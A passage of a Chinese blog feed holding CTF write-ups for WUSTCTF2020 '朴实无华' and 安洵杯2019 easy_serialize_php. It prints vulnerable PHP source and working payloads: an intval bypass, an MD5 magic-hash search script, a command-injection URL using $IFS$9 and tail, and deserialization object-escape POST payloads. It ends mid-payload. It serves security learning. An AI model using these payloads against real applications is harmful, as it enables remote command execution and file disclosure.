          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUSTCTF2020-朴实无华</title>
      <link href="/post/2021-05/%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/"/>
      <url>/post/2021-05/%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</url>
      
        <content type="html"><![CDATA[<h1 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h1><h3 id="考点：1-MD5碰撞-2-命令执行绕过"><a href="#考点：1-MD5碰撞-2-命令执行绕过" class="headerlink" title="考点：1.MD5碰撞        2.命令执行绕过"></a>考点：1.MD5碰撞        2.命令执行绕过</h3><p>打开题发现编码有些问题，修改编码为utf-8</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062020781.png" alt="image-20210615172904160"></p><p>看了源码和请求包没发现什么东西，看到title想到了robots.txt文件，打开看一看</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062020782.png" alt="image-20210615173103570"></p><p>额，打开后发现</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062020783.png" alt="image-20210615173125496"></p><p>在观察观察看到了这个</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062020784.png" alt="image-20210615173204851"></p><p>终于找到源代码了！！！开心vヾ(≧▽≦*)o</p><p>php源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先是绕过2个if就可以成功进行RCE了</p><h3 id="Levle-1"><a href="#Levle-1" class="headerlink" title="Levle 1"></a>Levle 1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)</span><br></pre></td></tr></table></figure><p>payload</p><blockquote><p>num = 2019e1</p></blockquote><p>本地测试一下就知道原因啦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">var_dump(<span class="variable">$num</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="variable">$num</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$num</span> + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="variable">$num</span> + <span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062020785.png" alt="image-20210615174138446"></p><h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$md5</span>==md5(<span class="variable">$md5</span>)</span><br></pre></td></tr></table></figure><ul><li>脚本走一波</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    md5 = hashlib.md5(<span class="string">f&#x27;0e<span class="subst">&#123;payload&#125;</span>&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> md5[:<span class="number">2</span>] == <span class="string">&#x27;0e&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> md5[<span class="number">2</span>:].isdigit():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;0e<span class="subst">&#123;payload&#125;</span>  <span class="subst">&#123;md5&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    payload += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>耐心点，可能要扫那么一小会</li></ul><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062020786.png" alt="image-20210615184819985"></p><ul><li><p>payload:</p></li><li><blockquote><p>md5=0e215962017</p></blockquote></li></ul><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><ul><li>这里过滤了空格和cat，这些都是小事</li></ul><ol><li>空格使用$IFS$9</li><li> cat可以换做用more，tail等其他方法</li></ol><ul><li>最终payload</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://91e9c6f4-17af-46f9-b641-d91522c24f26.node3.buuoj.cn/fl4g.php?num=2019e1&amp;md5=0e215962017&amp;get_flag=tail$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062020787.png" alt="image-20210615184751206"></p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯2019-easy_serialize_php</title>
      <link href="/post/2021-05/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Deasy_serialize_php/"/>
      <url>/post/2021-05/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Deasy_serialize_php/</url>
      
        <content type="html"><![CDATA[<h1 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h1><h3 id="考点：PHP反序列化的对象逃逸"><a href="#考点：PHP反序列化的对象逃逸" class="headerlink" title="考点：PHP反序列化的对象逃逸"></a>考点：PHP反序列化的对象逃逸</h3><p>PS：任何具有一定结构的数据，只要经过了某些处理把自身结构改变，则可能会产生漏洞</p><p><strong>过滤函数分为2种</strong></p><ol><li>关键词数增加</li><li>关键词数减少</li></ol><p>首先打开页面就可以查看源码（最喜欢做代码审计的题了(～￣▽￣)～）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>通过filter()函数可知，这个是属于第二种过滤函数（即关键词数减少）。</p><p>知道这些又有什么用呢？我们来一步一步的解读代码看看</p><ol><li>简单来说就是清空SESSION内的值，防止影响之后的传参</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>官方描述：extract() 函数从数组中将变量导入到当前的符号表。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;Original&quot;</span>;</span><br><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;Horse&quot;</span>);</span><br><span class="line">extract(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&gt;&gt; <span class="variable">$a</span> = Cat; <span class="variable">$b</span> = Dog; <span class="variable">$c</span> = Horse </span><br></pre></td></tr></table></figure><ol start="3"><li>这条代码没有那么难理解，但是它却决定了你最后输出了啥！（所以请牢记这条代码）</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>将session的值序列化之后进行过滤（同样很重要的一条代码）</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br></pre></td></tr></table></figure><ol start="5"><li>从这条代码可以发现，如果我们最后要读取数据，必须满足第3个if语句，并且要让’img’变成想要的参数，但是有通过第3段代码我们知道，如果要给’img_path’传参，之后会导致’img’的值为被sha1不可逆加密，所以必然是不可取得！所以我们必须要从<strong>数据改变结构的过程中进行改变数据</strong></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>[<span class="string">&#x27;abcdefg&#x27;</span>]=<span class="string">&#x27;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:5:&quot;Hello&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>[<span class="string">&#x27;cc&#x27;</span>]=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">==&gt; a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;abcdefg&quot;</span>;s:<span class="number">48</span>:<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:5:&quot;</span>Hello<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;cc&quot;</span>;i:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure><p>注意观察序列化后的字符串，想一想，如果在它之中删去一些东西，是不是可以改变它原本的内容<br>这就是题目一开始说的，过滤函数使关键词数减少,我们试着删除一些关键词：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;abcdefg&quot;</span>;s:<span class="number">48</span>:<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:5:&quot;</span>Hello<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;cc&quot;</span>;i:<span class="number">2</span>;&#125;</span><br><span class="line">==&gt;</span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">48</span>:<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:5:&quot;</span>Hello<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;cc&quot;</span>;i:<span class="number">2</span>;&#125;</span><br><span class="line">再次观察这个删除关键词后的序列化字符串</span><br></pre></td></tr></table></figure><p>它反序列化后应该是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span>[<span class="string">&quot;;s:48:]==&gt;&quot;</span><span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">Array[img]==&gt;&quot;</span>Hello<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p><strong>以上就是PHP反序列化对象逃逸中的“值逃逸”</strong></p><p>对象逃逸一共分为两种：</p><ol><li><p><strong>值逃逸</strong></p></li><li><p><strong>键逃逸</strong></p></li></ol><h4 id="接下来我们分别使用这2种方法来完成这道题，并从中学会如何逃逸"><a href="#接下来我们分别使用这2种方法来完成这道题，并从中学会如何逃逸" class="headerlink" title="接下来我们分别使用这2种方法来完成这道题，并从中学会如何逃逸"></a>接下来我们分别使用这2种方法来完成这道题，并从中学会如何逃逸</h4><h3 id="思路一：键逃逸"><a href="#思路一：键逃逸" class="headerlink" title="思路一：键逃逸"></a>思路一：键逃逸</h3><p>其中使用逃逸的键为’flagphp’</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST:_SESSION[flagphp]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">extract()==&gt; <span class="variable">$_SESSION</span>[flagphp]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">serialize()==&gt;</span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;flagphp&quot;</span>;s:<span class="number">48</span>:<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br><span class="line">filter()==&gt;</span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">48</span>:<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="思路二：值逃逸"><a href="#思路二：值逃逸" class="headerlink" title="思路二：值逃逸"></a>思路二：值逃逸</h3><p>其中使用逃逸的值为’flagflagflagflagflagflag’</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;</span><br><span class="line">==&gt; <span class="variable">$_SESSION</span>[user]=flagflagflagflagflagflag&amp;<span class="variable">$_SESSION</span>[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;</span><br><span class="line">==&gt; </span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">==&gt;</span></span><br><span class="line"><span class="string">a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:24:&quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span 